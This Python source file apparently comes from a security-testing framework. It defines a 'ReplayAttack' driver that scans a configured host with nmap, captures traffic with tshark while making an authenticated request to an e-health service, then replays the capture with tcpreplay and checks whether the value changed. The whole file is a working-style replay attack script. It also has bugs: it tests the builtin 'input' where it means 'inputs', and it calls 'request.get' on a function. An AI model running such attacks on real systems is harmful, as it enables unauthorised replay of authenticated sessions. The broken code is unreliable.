__author__ = 'Filippo Gaudenzi'
__email__ = 'filippo.gaudenzi@unimi.it'
import subprocess
from requests.auth import HTTPBasicAuth
from requests import request
from libnmap.process import NmapProcess
from libnmap.parser import NmapParser, NmapParserException
from logger import check_change_value
from nmap import scan_nmap
from driver import Driver

class ReplayAttack(Driver):
    def nmapRun (self, inputs):
      scan_nmap(self.testinstances["config"]["host"],self.testinstances["config"]["port"])
    def tcpdump(self,inputs):
      eth=self.testinstances["dump"]["interface"]
      if input == True:
        return True
      else:
        bash_command = "tshark -i " + eth + " -w test.pcap -F libpcap -a duration:200"
        process = subprocess.Popen(bash_command.split(), stdout=subprocess.PIPE)
        login_ti = self.testinstances.get("login", None)
        auth = HTTPBasicAuth(login_ti.get('user'), login_ti.get('password'))
        r=request.get('https://aes.ehealth.local/changevalue/11', auth=auth)
        result_dict=r.json()
        value=result_dict["index"]
        output, error = process.communicate()
        return value
    def tcpreplay(self,inputs):
      if input == True:
        return True
      else:
        value=inputs
        bash_command = "tcpreplay --intf1=en0 test.pcap"
        process = subprocess.Popen(bash_command.split(), stdout=subprocess.PIPE)
        output, error = process.communicate()
        return check_change_value(value)
    def rollback (self, inputs):
      return False
    def appendAtomics(self):
        self.appendAtomic(self.nmapRun, self.rollback)
        self.appendAtomic(self.tcpdump, self.rollback)
        self.appendAtomic(self.tcpreplay, self.rollback)


